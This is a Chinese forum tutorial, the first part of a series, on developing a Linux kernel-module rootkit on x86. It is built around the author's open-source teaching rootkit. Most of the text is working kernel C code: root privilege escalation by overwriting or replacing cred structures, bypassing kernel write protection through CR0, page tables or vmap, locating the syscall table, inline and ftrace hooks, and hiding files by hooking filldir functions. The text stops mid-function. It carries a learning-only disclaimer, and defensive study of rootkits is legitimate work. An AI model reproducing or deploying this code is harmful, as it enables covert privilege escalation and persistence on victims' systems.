> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.kanxue.com](https://bbs.kanxue.com/thread-285916.htm)

> [原创] 通用 Linux kernel rootkit 开发导论（一）

0x00. 一切开始之前
============

「Rootkit」即「root kit」，中文直译为「根工具包」，通常指代一类具有较高权限的恶意软件，其通常以内核模块的形式存在，在网络攻防当中被用作权限维持的目的

本系列文章将对 Linux 下基于 LKM 的 rootkit 实现技术进行汇总，主要基于 x86 架构，**仅供实验与学习，请勿用作违法犯罪：(**

同时笔者将本文所涉及的技术实现整合为一个教学用 Rootkit 并开源于 [https://github.com/arttnba3/Nornir-Rootkit](elink@6f4K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6S2M7Y4c8@1L8X3u0S2x3#2)9J5c8V1&6G2M7X3&6A6M7W2)9J5k6q4u0G2L8%4c8C8K9i4b7`.) ，希望大家能多来点 star ：）

0x01. 进程提权
==========

一个进程的权限由其 PCB （即 `task_struct` 结构体）中指定的 `cred` 结构体决定，位于内核空间中的 rootkit 可以很方便地通过修改、替换`cred` 结构体等方式来帮助我们的恶意进程进行提权：）

### 方法 ①：直接修改进程的 cred

直接将 `cred` 的 `uid`、`gid` 等字段修改为 0 即可完成提权，下面是笔者给出的示例代码

```
static __always_inline struct task_struct* nornir_find_task_by_pid(pid_t pid)
{
    return pid_task(find_vpid(pid), PIDTYPE_PID);
}
 
static __maybe_unused void nornir_grant_root_by_cred_overwrite(pid_t pid)
{
    struct task_struct *task;
    struct cred *cred;
    
    task = nornir_find_task_by_pid(pid);
    if (!task) {
        logger_error(
            "Unable to find task_struct of pid %d, root grant failed.\n",
            pid
        );
        return ;
    }
 
    cred = (struct cred*) task->real_cred;
    cred->uid = cred->euid = cred->suid = cred->fsuid = KUIDT_INIT(0);
    cred->gid = cred->egid = cred->sgid = cred->fsgid = KGIDT_INIT(0);
 
    if (unlikely(task->cred != task->real_cred)) {
        logger_warn("Mismatched cred & real_cred detected for task %d.\n", pid);
        cred = (struct cred*) task->cred;
        cred->uid = cred->euid = cred->suid = cred->fsuid = KUIDT_INIT(0);
        cred->gid = cred->egid = cred->sgid = cred->fsgid = KGIDT_INIT(0);
    }
 
    logger_info("Root privilege has been granted to task %d.\n", pid);
}
```

### 方法 ②：复制 init 进程的 cred

在老版本内核上可以直接通过 `commit_creds(prepare_kernel_cred(NULL))` 完成提权，但是在较新版本的内核当中 `prepare_kernel_cred(NULL)` 会分配失败，不过 `prepare_kernel_cred()` 函数本质上是拷贝复制一个进程的 `cred` ，因此我们不难想到的是**我们可以直接复制有 root 权限的 init 进程的 cred**

虽然 init 进程的 PCB `init_task` 与 credential `init_cred` 都是静态分配的，但是这两个符号不一定会导出，且直接在内存中进行搜索也不简单，不过 **init 进程是所有进程最终的父进程，其父进程为其自身**，因此我们可以直接通过 `task_struct->parent` 不断向上直接找到 `init_task` 后 `commit_creds(prepare_kernel_cred(&init_task))` 完成提权，示例代码如下：

```
static __always_inline struct task_struct* nornir_find_root_pcb(void)
{
    struct task_struct *task;
 
    task = current;
    if (unlikely(task->parent == task)) {
        logger_error("detected out-of-tree task_struct, pid: %d\n", task->pid);
        return NULL;
    }
 
    do {
        task = task->parent;
    } while (task != task->parent);
 
    return task;
}
 
static __maybe_unused void nornir_grant_root_by_cred_replace(pid_t pid)
{
    struct task_struct *task;
    struct cred *old, *new;
    
    task = nornir_find_task_by_pid(pid);
    if (!task) {
        logger_error(
            "Unable to find task_struct of pid %d, root grant failed.\n",
            pid
        );
        return ;
    }
 
    new = prepare_kernel_cred(task);
    if (!new) {
        logger_error("Unable to allocate new cred, root grant failed.\n");
        return ;
    }
 
    old = (struct cred*) task->real_cred;
 
    get_cred(new);
    rcu_assign_pointer(task->real_cred, new);
    rcu_assign_pointer(task->cred, new);
 
    put_cred(old);
    put_cred(old);
 
    logger_info("Root privilege has been granted to task %d.\n", pid);
}
```

0x02. 函数劫持
==========

rootkit 通常需要修改内核部分函数逻辑来达成特定目的，例如劫持 `getdents` 系统调用来完成文件隐藏等；劫持函数的方法多种多样，本节笔者将给出一些比较经典的方案

PRE. 修改只读代码 / 数据段
-----------------

系统代码段、一些静态定义的函数表（包括系统调用表在内）的**权限通常都被设为只读， 我们无法直接修改这些区域的内容** ，因此我们还需要一些手段来绕过只读保护，这里笔者给出常见的几种方法

#### 方法 ①：利用 vmap/ioremap 进行重映射完成物理内存直接改写（推荐）

对虚拟地址空间的访问实际上是对指定物理页面的访问，我们可以通过**将目标物理页框映射到新的可写虚拟内存**的方式完成对只读内存区域数据的覆写

我们可以直接通过 `virt_to_phys()` 、`virt_to_pfn()` 等宏获取到目标区域虚拟地址对应的物理地址后再通过 `vmap()` 等函数将目标物理页框重新映射到一个新的虚拟地址上即可完成对只读内存数据的改写

数据覆写完成后再 `vunmap()` 即可，示例代码如下：

```
static __maybe_unused
void nornir_overwrite_romem_by_vmap(void *dst, void *src, size_t len)
{
    size_t dst_virt, dst_off, dst_remap;
    struct page **pages;
    unsigned int page_nr, i;
 
    page_nr = (len >> PAGE_SHIFT) + 2;
    pages = kcalloc(page_nr, sizeof(struct page*), GFP_KERNEL);
    if (!pages) {
        logger_error(
            "Unable to allocate page array for vmap, operation aborted.\n"
        );
        return ;
    }
 
    dst_virt = (size_t) dst & PAGE_MASK;
    dst_off = (size_t) dst & (PAGE_SIZE - 1);
    for (i = 0; i < page_nr; i++) {
        pages[i] = virt_to_page(dst_virt);
        dst_virt += PAGE_SIZE;
    }
 
    dst_remap = (size_t) vmap(pages, page_nr, VM_MAP, PAGE_KERNEL);
    if (dst_remap == 0) {
        logger_error("Unable to map pages with vmap, operation aborted.\n");
        goto free_pages;
    }
 
    memcpy((void*) (dst_remap + dst_off), src, len);
 
    vunmap((void*) dst_remap);
 
free_pages:
    kfree(pages);
}
```

> 虽然 direct mapping area 有着对所有物理内存的映射，但是**也根据映射的区域权限进行了相应的权限设置**（例如映射 text 段的页面为可读可执行权限），因此我们无法通过这块区域进行覆写，而需要重新建立新的映射
> 
> 因此 `kmap()` 同样无法帮助我们完成对只读区域的改写，因为其会先检查相应的 `page` 是否已经在 direct mapping area 上有着对应的映射并进行复用 ：(

#### 方法 ②：修改 cr0 寄存器

只读保护的开关其实是由 cr0 寄存器中的 `write protect` 位决定的，只要我们能够将 cr0 的这一位置 0 便能关闭只读保护，**从而直接改写内存中只读区域的数据**

> 这也是上古时期比较经典的一些 rootkit 的实现方案

![](https://s2.loli.net/2023/03/06/UVQJYDI1f4iTFwP.png)

直接写内联汇编即可，这里笔者给出一个通用的改写内存只读区域的代码：

```
static __always_inline u64 nornir_read_cr0(void)
{
    u64 cr0;
 
    asm volatile (
        "movq  %%cr0, %%rax;"
        "movq  %%rax, %0;   "
        : "=r" (cr0) :: "%rax"
    );
 
    return cr0;
}
 
static __always_inline void nornir_write_cr0(u64 cr0)
{
    asm volatile (
        "movq   %0, %%rax;  "
        "movq  %%rax, %%cr0;"
        :: "r" (cr0) : "%rax"
    );
}
 
static __always_inline void nornir_disable_write_protect(void)
{
    u64 cr0;
 
    cr0 = nornir_read_cr0();
 
    if ((cr0 >> 16) & 1) {
        cr0 &= ~(1 << 16);
        nornir_write_cr0(cr0);
    }
}
 
static __always_inline void nornir_enable_write_protect(void)
{
    size_t cr0;
 
    cr0 = nornir_read_cr0();
 
    if (!((cr0 >> 16) & 1)) {
        cr0 |= (1 << 16);
        nornir_write_cr0(cr0);
    }
}
 
static __maybe_unused
void nornir_overwrite_romem_by_cr0(void *dst, void *src, size_t len)
{
    u64 orig_cr0;
 
    orig_cr0 = nornir_read_cr0();
    nornir_disable_write_protect();
 
    memcpy(dst, src, len);
 
    if ((orig_cr0 >> 16) & 1) {
        nornir_enable_write_protect();
    }
}
```

#### 方法 ③：直接修改内核页表项

操作系统对于内存页读写权限的控制实际上是通过设置页表项中对应的标志位来完成的：

![](https://s2.loli.net/2022/03/15/begX4uJNymUs92a.png)

因此我们也可以**通过直接修改对应页表项的方式完成对只读内存的读写**，下面笔者给出如下示例代码：

```
static __maybe_unused
void nornir_overwrite_romem_by_pgtbl(void *dst, void *src, size_t len)
{
    pte_t *dst_pte;
    pte_t orig_pte_val;
    unsigned int level;
    size_t left;
 
    do {
        dst_pte = lookup_address((unsigned long) dst, &level);
        orig_pte_val.pte = dst_pte->pte;
 
        left = PAGE_SIZE - ((size_t) dst & (PAGE_SIZE - 1));
 
        dst_pte->pte |= _PAGE_RW;
        memcpy(dst, src, left);
 
        dst_pte->pte = orig_pte_val.pte;
 
        dst = (size_t) dst + left;
        src = (size_t) src + left;
        len -= left;
    } while (len > PAGE_SIZE);
}
```

一、查找系统调用表
---------

当进行系统调用时实际上会通过**系统调用表**获取到对应系统调用的函数指针后进行调用（`syscall_nr→syscall_func` 的指针数组），因此我们可以很方便的通过该表获取到不同系统调用的函数地址，**并通过劫持该表以劫持系统调用流程**：

```
asmlinkage const sys_call_ptr_t sys_call_table[] = {
#include }; 
```

但系统调用表符号是不导出的 :（ 因此我们还需要通过其他的方式找到系统调用表的地址

系统调用对应的函数其实是在编译期[动态生成](elink@f6cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6C8k6i4u0F1k6h3I4Q4x3X3g2Y4L8$3!0Y4L8r3g2K6L8%4g2J5j5$3g2Q4x3X3g2U0L8$3#2Q4x3V1k6H3N6h3u0Q4x3V1k6K6j5$3#2Q4x3V1k6D9K9h3&6#2P5q4)9J5c8X3E0W2M7X3&6W2L8q4)9J5c8X3N6A6N6q4)9J5c8X3q4^5j5X3!0W2i4K6u0r3L8r3W2F1N6i4S2Q4x3X3c8T1L8r3!0U0K9#2)9J5c8W2)9J5b7W2)9J5c8X3q4A6L8#2)9J5k6s2m8G2L8r3I4Q4x3X3c8J5K9h3&6Y4i4K6u0r3j5i4u0U0K9q4)9J5c8Y4R3^5y4W2)9J5c8X3g2F1N6s2u0&6i4K6u0r3M7%4W2K6j5$3q4D9L8s2y4Q4x3V1k6K6P5i4y4U0j5h3I4D9i4K6g2X3y4U0c8Q4x3X3g2@1j5X3H3`.)的，而生成的这些函数符号会导出到 kallsyms 中，因此我们可以通过搜索函数指针的方式来查找系统调用表的位置：）

但是在较高版本的内核当中 kallsyms 相关的符号 _仍然是不导出的_ ，因此这里笔者选择采用直接读取 /proc/kallsyms 的方式；由于序列文件接口在内核空间不可直接读，因此我们需要通过在用户态开辟空间的方式进行读取（参考笔者的 [这个项目](elink@533K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6S2M7Y4c8@1L8X3u0S2x3#2)9J5c8X3E0S2L8r3I4K6P5h3#2K6i4K6g2X3L8r3!0G2K9%4g2H3k6i4t1`.)），核心代码如下：

```
static int nornir_ksym_addr_lookup_internal(const char *name,
                                            size_t *res,
                                            const char **ignore_mods,
                                            const char *ignore_types)
{
    int error = 0;
    struct file *ksym_fp;
    struct ksym_info *info;
 
    ksym_fp = filp_open("/proc/kallsyms", O_RDONLY, 0);
 
    if (IS_ERR(ksym_fp)) {
        error = PTR_ERR(ksym_fp);
        goto out_ret;
    }
 
    info = kmalloc(sizeof(*info), GFP_KERNEL);
    if (!info) {
        error = -ENOMEM;
        goto out_free_file;
    }
 
    error=nornir_find_ksym_info(ksym_fp, name, info, ignore_mods, ignore_types);
    if (error) {
        goto out_free_info;
    }
 
    *res = info->addr;
 
out_free_info:
    kfree(info);
out_free_file:
    filp_close(ksym_fp, NULL);
out_ret:
    return error;
}
 
int nornir_ksym_addr_lookup(const char *name,
                         size_t *res,
                         const char **ignore_mods,
                         const char *ignore_types)
{
    struct cred *old, *root;
    int ret;
 
    old = (struct cred*) get_current_cred();
 
    root = prepare_kernel_cred(
        pid_task(
            find_pid_ns(1, task_active_pid_ns(current)),
            PIDTYPE_PID
        )
    );
    if (!root) {
        logger_error("FAILED to allocated a new cred, kallsyms lookup failed.");
        put_cred(old);
        return -ENOMEM;
    }
 
    get_cred(root);
    commit_creds(root);
 
    ret = nornir_ksym_addr_lookup_internal(name, res, ignore_mods, ignore_types);
 
    commit_creds(old);
 
    put_cred(root);
 
    return ret;
}
```

> 解析 `/proc/kallsyms` 内容的代码就不在这放出了，本质上就是个建议的递归下降解析器，完整代码参见源码的 `src/libs/ksym.c`

之后我们只需要定位几个连续的系统调用函数指针便能定位到系统调用表，也可以直接查找符号 `sys_call_table`

二、函数表 hook
----------

包括系统调用在内，内核中的大部分系统调用其实都是通过调用函数表中的函数指针完成的，因此我们可以直接通过劫持特定表中的函数指针的方式来完成 hook

笔者将在后文的一些具体场景下给出该技术的示例

三、 inline hook
--------------

**内联钩子** （inline hook）算是一个比较经典的思路，其核心原理是**将函数内的 hook 点位修改为一个 jmp 指令，使其跳转到恶意代码处执行**，完成恶意代码的执行之后再恢复执行被 jmp 指令所覆盖的部分指令，之后跳转回原 hook 点位的下一条指令继续执行，这样便在保证了原函数基础功能的情况下完成了恶意代码执行

![](https://s2.loli.net/2023/03/06/A61kKsbcuqXet4L.png)

通过 `Intel SDM` 我们可以很方便地获取到 jmp 指令的格式，从而编写相应的跳转指令，并通过前文的修改只读内存函数来完成对代码段的改写

![](https://s2.loli.net/2023/03/06/up9JdfO3ANIiEVM.png)

但由于 x86 为 CISC 指令集，**指令长度并不固定**，因此 inline hook 往往需要一个额外且庞大的模块来帮我们识别 hook 点位的数条指令，这令 inline hook 的流程变得较为复杂 ：(

> 在 Github 上也有一些开源的 inline hook 框架，如大名鼎鼎的 [Reptile](elink@d38K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6X3x3s2u0T1x3h3c8V1x3$3&6Q4x3V1k6d9k6i4m8@1K9h3I4W2) 使用的便是非常经典的 [khook](elink@d3aK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6E0K9h3I4S2j5Y4y4Q4x3V1k6C8K9r3!0G2K9H3`.`.) （典中典组合了这下）

### 动态 inline hook 技术（适用劫持于短时间内不会被频繁调用的代码）

常规的 inline hook 不仅要将 hook 点位的代码 patch 为 jmp 指令，还需要识别与保存 hook 点位上的指令以在恶意代码执行完后恢复这些指令的执行再跳转执行 hook 点位的后续代码，x86 指令集的非定长的特性使得这套流程变得异常繁琐：(

现在笔者给出一种特别的 inline hook 方法，笔者称之为 **动态 inline hook 技术** ，其基本流程如下：

*   保存 hook 点位上的数据（无需识别指令，只需要保存 `jmp` 长度的数据）
*   修改 hook 点位上的指令为 `jmp` 指令，使其在执行时会跳转到我们的恶意函数
*   在恶意函数中**恢复 hook 点位上数据的原值，随后调用 hook 点位**（function call）
*   **重新将 hook 点位上指令修改为 `jmp` 指令**，之后进行正常的函数返回

这种方法**不会破坏函数调用栈，也不需要对 hook 点位上的原指令进行识别**，大幅简化了 hook 流程，当然缺点就是 _有概率存在条件竞争问题_ ，但通常我们要劫持的函数一般不会在同一时间被多个线程同时调用 ：）

现笔者给出如下的 **通用 hook 框架** 代码，我们只需要为不同的 hook 点位定义不同的基础设施即可完成对指定代码位置的 hook：

```
typedef size_t (*hook_fn) (size_t, size_t, size_t, size_t, size_t, size_t);
 
struct asm_hook_info {
    uint8_t orig_data[HOOK_BUF_SZ];
    hook_fn hook_before;
    hook_fn exec_orig;
    hook_fn orig_func;
    hook_fn new_dst;
    size_t (*hook_after) (size_t orig_ret, size_t *args);
};
 
static __always_inline
void nornir_raw_write_inline_hook(void *target, void *new_dst)
{
    size_t dst_off = (size_t) new_dst - (size_t) target;
    uint8_t asm_buf[0x100];
 
#ifdef CONFIG_X86_64
    memset(asm_buf, X86_NOP_INSN, sizeof(asm_buf));
    asm_buf[0] = X86_JMP_PREFIX;
    *(size_t*) &asm_buf[1] = dst_off - X86_JMP_DISTENCE;
    nornir_overwrite_romem(target, asm_buf, HOOK_BUF_SZ);
#else
    #error "No supported architecture were chosen for inline hook"
#endif
}
 
static __always_inline
void nornir_raw_write_orig_hook_buf_back(struct asm_hook_info *info)
{
#ifdef CONFIG_X86_64
    nornir_overwrite_romem(info->orig_func, info->orig_data, HOOK_BUF_SZ);
#else
    #error "No supported architecture were chosen for inline hook"
#endif
}
 
size_t nornir_asm_inline_hook_helper(struct asm_hook_info *info, size_t *args)
{
    size_t ret;
 
    if (info->hook_before) {
        ret=info->hook_before(args[0],args[1],args[2],args[3],args[4],args[5]);
    }
 
    if (info->exec_orig
        && info->exec_orig(args[0],args[1],args[2],args[3],args[4],args[5])) {
        nornir_raw_write_orig_hook_buf_back(info);
        ret = info->orig_func(args[0],args[1],args[2],args[3],args[4],args[5]);
        nornir_raw_write_inline_hook(info->orig_func, info->new_dst);
    }
 
    if (info->hook_after) {
        ret = info->hook_after(ret, args);
    }
 
    return ret;
}
```

四、ftrace hook
-------------

`ftrace` 是内核提供的一个调试框架，当内核开启了 `CONFIG_FUNCTION_TRACER` 编译选项时我们可以使用 `ftrace` 来追踪内核中的函数调用

`ftrace` 通过在函数开头插入 `fentry()` 或 `mcount()` 实现，为了降低性能损耗，在编译时会在函数的开头插入 `nop` 指令，当开启 frace 时再动态地将待跟踪函数开头的 `nop` 指令替换为跳转指令：

![](https://s2.loli.net/2023/03/08/lxOvYXkIDqcTif9.png)

以 `commit_creds()` 为例，插入 ftrace 的跳转点前后如下：

![](https://s2.loli.net/2023/03/14/uoJhx1alj3ImpXk.png)

![](https://s2.loli.net/2023/03/14/UiTLN3QRCeJtsGj.png)

利用 `ftrace` ，我们可以非常方便地 hook 内核中的大部分函数：）

> 这里其实可以直接使用[一些现成的框架](elink@406K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4y4@1i4K6u0W2k6$3W2@1K9s2g2T1i4K6u0W2j5$3!0E0i4K6u0r3P5r3y4W2L8r3I4W2M7X3q4@1L8%4u0Q4x3V1k6S2j5K6u0U0x3o6x3&6j5e0k6T1j5X3b7%4y4K6R3J5x3e0l9$3x3U0p5^5x3U0V1^5k6U0g2W2y4h3q4U0x3b7`.`.)，不过本文主要是为了学习技术背后的原理，因此笔者不会选择使用一些现有的框架，而是会从头开始重新写：）

`ftrace` 的核心结构是 `ftrace_ops`，用来表示一个 hook 点的基本信息，通常我们只需要用到 `func` 和 `flags` 两个成员：

```
typedef void (*ftrace_func_t)(unsigned long ip, unsigned long parent_ip,
                              struct ftrace_ops *op, struct ftrace_regs *fregs);
//...
 
 
struct ftrace_ops {
        ftrace_func_t                        func;
        struct ftrace_ops __rcu                *next;
        unsigned long                        flags;
        //...
};
```

当我们创建好一个 `ftrace_ops` 之后，我们便可以使用 `ftrace_set_filter_ip()` 将其注册到 filter 中，也可以使用该函数将一个 `ftrace_ops` 从 filter 中删除：

```
/**
* ftrace_set_filter_ip - set a function to filter on in ftrace by address
* @ops - the ops to set the filter with
* @ip - the address to add to or remove from the filter.
* @Remove - non zero to remove the ip from the filter
* @Reset - non zero to reset all filters before applying this filter.
*
* Filters denote which functions should be enabled when tracing is enabled
* If @ip is NULL, it fails to update filter.
*
* This can allocate memory which must be freed before @ops can be freed,
* either by removing each filtered addr or by using
* ftrace_free_filter(@ops).
*/
int ftrace_set_filter_ip(struct ftrace_ops *ops, unsigned long ip,
                         int remove, int reset)
```

当我们将一个 `ftrace_ops` 添加到 filter 中后，我们可以使用 `register_ftrace_function()` 将其放置到 hook 点位上；而在我们将其从 filter 中删除之前，我们需要调用 `unregister_ftrace_function()` 将其从 hook 点上脱离；下面是笔者给出的示例代码：

```
static __maybe_unused struct ftrace_ops*
nornir_install_ftrace_hook_internal(void *target, ftrace_func_t new_dst)
{
    struct ftrace_ops *hook_ops;
    int err;
    
    hook_ops = kmalloc(GFP_KERNEL, sizeof(*hook_ops));
    if (!hook_ops) {
        err = -ENOMEM;
        logger_error("Unable to allocate memory for new ftrace_ops.\n");
        goto no_mem;
    }
    memset(hook_ops, 0, sizeof(*hook_ops));
    hook_ops->func = new_dst;
    hook_ops->flags = FTRACE_OPS_FL_SAVE_REGS
                    | FTRACE_OPS_FL_RECURSION
                    | FTRACE_OPS_FL_IPMODIFY;
 
    err = ftrace_set_filter_ip(hook_ops, (unsigned long) target, 0, 0);
    if (err) {
        logger_error(
            "Failed to set ftrace filter for target addr: %p.\n",
            target
        );
        goto failed;
    }
 
    err = register_ftrace_function(hook_ops);
    if (err) {
        logger_error(
            "Failed to register ftrace fn for target addr: %p.\n",
            target
        );
        goto failed;
    }
 
    logger_info(
        "Install ftrace hook at %p, new destination: %p.\n",
        target,
        new_dst
    );
 
    return hook_ops;
 
failed:
    kfree(hook_ops);
no_mem:
    return ERR_PTR(err);
}
 
static __maybe_unused int
nornir_uninstall_ftrace_hook_internal(struct ftrace_ops*hook_ops, void*hook_dst)
{
    int err;
 
    err = unregister_ftrace_function(hook_ops);
    if (err) {
        logger_error("failed to unregister ftrace.");
        goto out;
    }
 
    err = ftrace_set_filter_ip(hook_ops, (unsigned long) hook_dst, 1, 0);
    if (err) {
        logger_error("failed to rmove ftrace point.");
        goto out;
    }
 
out:
    return err;
}
```

这里我们还是以 `commit_cred()` 作为范例进行测试，在我们自定义的 `hook` 点当中我们可以通过 `fregs` 参数直接改变任一寄存器的值，由于 ftrace 的 hook 点位于函数开头，尚未开辟该函数的栈空间，这里我们可以选择将 `rip` 直接改为一条 `ret` 指令从而使其直接返回，之后我们再在 hook 函数中重新调用原函数的功能部分即可，这里需要注意的是要跳过开头的 `endbr64` + `call` 两条指令总计 9 字节：

```
__attribute__((naked)) void ret_fn(void)
{
    asm volatile (" ret; ");
}
 
void test_hook_fn(unsigned long ip, unsigned long pip,
                    struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
    size_t (*orig_commit_creds)(size_t) = \
                                (size_t(*)(size_t))((size_t) commit_creds + 9);
 
    printk(KERN_ERR "[test hook] bbbbbbbbbbbbbbbbbbbbbbbbbbbb");
 
    fregs->regs.ax = orig_commit_creds(fregs->regs.di);
    fregs->regs.ip = ret_fn;
 
    return ;
}
```

0x03. 文件隐藏
==========

我们的 rootkit 既然要长久驻留在系统上，那么在系统每一次开机时都应当载入我们的 rootkit，这就要求**我们的 rootkit 文件还需要保留在硬盘上**，同时我们有的时候也需要启动一些用户态进程来帮助我们完成一些任务，**用户态进程的二进制文件也需要我们进行隐藏**，除此之外我们可能也想要隐藏一些日志文件...

因此接下来我们还要完成相关文件的隐藏的工作

> 注：本节需要你提前对 VFS 有着一定的了解：）

一、劫持 getdents 系统调用核心函数
----------------------

当我们使用 `ls` 查看某个目录下的文件时，实际上会调用到 `getdents64()` / `getdents()` / `compat_getdents()` 这三个系统调用之一来获取某个目录下的文件信息，并以如下形式的结构体数组返回：

```
/* getdents */
struct linux_dirent {
        unsigned long        d_ino;
        unsigned long        d_off;
        unsigned short        d_reclen;
        char                d_name[1];
};
 
/* getdents64 */
struct linux_dirent64 {
        u64                d_ino;
        s64                d_off;
        unsigned short        d_reclen;
        unsigned char        d_type;
        char                d_name[];
};
```

而用来遍历文件的系统调用的核心逻辑实际上都是通过 `iterate_dir()` 来实现的：

```
SYSCALL_DEFINE3(getdents, unsigned int, fd,
                struct linux_dirent __user *, dirent, unsigned int, count)
{
        struct fd f;
        struct getdents_callback buf = {
                .ctx.actor = filldir,
                .count = count,
                .current_dir = dirent
        };
        int error;
 
        f = fdget_pos(fd);
        if (!f.file)
                return -EBADF;
 
        error = iterate_dir(f.file, &buf.ctx);
 
//...
 
SYSCALL_DEFINE3(getdents64, unsigned int, fd,
                struct linux_dirent64 __user *, dirent, unsigned int, count)
{
        struct fd f;
        struct getdents_callback64 buf = {
                .ctx.actor = filldir64,
                .count = count,
                .current_dir = dirent
        };
        int error;
 
        f = fdget_pos(fd);
        if (!f.file)
                return -EBADF;
 
        error = iterate_dir(f.file, &buf.ctx);
 
//...
 
COMPAT_SYSCALL_DEFINE3(getdents, unsigned int, fd,
                struct compat_linux_dirent __user *, dirent, unsigned int, count)
{
        struct fd f;
        struct compat_getdents_callback buf = {
                .ctx.actor = compat_filldir,
                .current_dir = dirent,
                .count = count
        };
        int error;
 
        f = fdget_pos(fd);
        if (!f.file)
                return -EBADF;
 
        error = iterate_dir(f.file, &buf.ctx);
```

而在 `iterate_dir()` 中实际上会调用对应文件的函数表中的 `iterate_shared` / `iterate` 函数：

```
int iterate_dir(struct file *file, struct dir_context *ctx)
{
        struct inode *inode = file_inode(file);
        bool shared = false;
        int res = -ENOTDIR;
        if (file->f_op->iterate_shared)
                shared = true;
        else if (!file->f_op->iterate)
                goto out;
 
        //...
        if (!IS_DEADDIR(inode)) {
                ctx->pos = file->f_pos;
                if (shared)
                        res = file->f_op->iterate_shared(file, ctx);
                else
                        res = file->f_op->iterate(file, ctx);
                //...
```

以 ext4 文件系统为例，其实际上会调用到 `ext4_readdir` 函数：

```
const struct file_operations ext4_dir_operations = {
        .llseek                = ext4_dir_llseek,
        .read                = generic_read_dir,
        .iterate_shared        = ext4_readdir,
```

存在如下调用链：

```
ext4_readdir()
    ext4_dx_readdir()// htree-indexed 文件系统会调用到这个（通常都是）
        call_filldir()
            dir_emit()
                ctx->actor() // 填充返回给用户的数据缓冲区
```

填充返回给用户的数据的核心逻辑便是调用 `ctx->actor()`，**也就是调用 filldir/filldir64/compat_filldir 函数**，这也是大部分文件系统对于 `iterate/iterate_shared` 的实现核心之一，而这类函数的作用其实是**将文件遍历的单个结果填充回用户空间**

由此我们有两种隐藏文件的方法：

*   **直接劫持** `filldir&filldir64&compat_filldir` **函数，在遇到我们要隐藏的文件时直接返回**，从而完成文件隐藏的功能
*   由于 `iterate_dir()` 的参数之一便是 `ctx` ，因此我们也可以劫持 `iterate_dir()` 后修改 `ctx->actor`

> 需要注意的是这些函数对内核模块并不导出，因此我们需要通过用户态进程辅助读取 `/proc/kallsyms` 来获得其地址

hook 函数的模板在前面已经给出，这里不再赘叙，我们只需要判断是否为我们要隐藏的文件，如果是则直接返回即可，现笔者给出如下示例代码：

```
static int
nornir_exec_orig_compat_filldir(struct dir_context*ctx, const char *name,
                                int namlen, loff_t offset, u64 ino,
                                unsigned int d_type)
{
    if (unlikely(nornir_get_hidden_file_info(name, namlen))) {
        return 0;
    } else {
        return 1;
    }
}
 
static void
nornir_evil_filldir_ftrace(unsigned long ip, unsigned long parent_ip,
                           struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
#ifdef CONFIG_X86_64
    if (unlikely(!nornir_exec_orig_filldir(
        (void*) fregs->regs.di, (void*) fregs->regs.si, (int) fregs->regs.dx,
        (loff_t) fregs->regs.cx, (u64) fregs->regs.r8, (unsigned) fregs->regs.r9
    ))) {
        fregs->regs.ip = (size_t) nornir_filldir_placeholder;
    }
#else
    #error "We do not support ftrace hook under current architecture yet"
#endif
}
 
static void
nornir_evil_filldir64_ftrace(unsigned long ip, unsigned long parent_ip,
                             struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
#ifdef CONFIG_X86_64
    if (unlikely(!nornir_exec_orig_filldir64(
        (void*) fregs->regs.di, (void*) fregs->regs.si, (int) fregs->regs.dx,
        (loff_t) fregs->regs.cx, (u64) fregs->regs.r8, (unsigned) fregs->regs.r9
    ))) {
        fregs->regs.ip = (size_t) nornir_filldir_placeholder;
    }
#else
    #error "We do not support ftrace hook under current architecture yet"
#endif
}
 
static void
nornir_evil_compat_filldir_ftrace(unsigned long ip, unsigned long parent_ip,
                                  struct ftrace_ops *ops,
                                  struct ftrace_regs *fregs)
{
#ifdef CONFIG_X86_64
    if (unlikely(!nornir_exec_orig_compat_filldir(
        (void*) fregs->regs.di, (void*) fregs->regs.si, (int) fregs->regs.dx,
        (loff_t) fregs->regs.cx, (u64) fregs->regs.r8, (unsigned) fregs->regs.r9
    ))) {
        fregs->regs.ip = (size_t) nornir_filldir_placeholder;
    }
#else
    #error "We do not support ftrace hook under current architecture yet"
#endif
}
 
static int nornir_install_ftrace_filldir_hooks(void)
{
    int err;
 
    err = nornir_install_ftrace_hook(orig_filldir, nornir_evil_filldir_ftrace);
    if (err) {
        logger_error("Unable to hook symbol \"filldir\".\n");
        goto err_filldir;
    }
 
    err = nornir_install_ftrace_hook(
        orig_filldir64,
        nornir_evil_filldir64_ftrace
    );
    if (err) {
        logger_error("Unable to hook symbol \"filldir64\".\n");
        goto err_filldir64;
    }
 
    err = nornir_install_ftrace_hook(
        orig_compat_filldir,
        nornir_evil_compat_filldir_ftrace
    );
    if (err) {
        logger_error("Unable to hook symbol \"compat_filldir\".\n");
        goto err_compat_filldir;
    }
 
    return 0;
 
err_compat_filldir:
    nornir_remove_ftrace_hook(orig_filldir64);
err_filldir64:
    nornir_remove_ftrace_hook(orig_filldir);
err_filldir:
    return err;
}
 
static int nornir_init_filldir_hooks(void)
{
    if (nornir_ksym_addr_lookup("filldir", (size_t*)&orig_filldir, NULL, NULL)){
        logger_error("Unable to look up symbol \"filldir\".\n");
        return -ECANCELED;
    }
 
    if (nornir_ksym_addr_lookup(
        "filldir64",
        (size_t*) &orig_filldir64,
        NULL,
        NULL
    )) {
        logger_error("Unable to look up symbol \"filldir64\".\n");
        return -ECANCELED;
    }
 
    if (nornir_ksym_addr_lookup(
        "compat_filldir",
        (size_t*) &orig_compat_filldir,
        NULL,
        NULL
    )) {
        logger_error("Unable to look up symbol \"compat_filldir\".\n");
        return -ECANCELED;
    }
 
#ifdef CONFIG_NORNIR_HIDE_FILE_HIJACK_GETDENTS_INLINE
    return nornir_install_inline_asm_filldir_hooks();
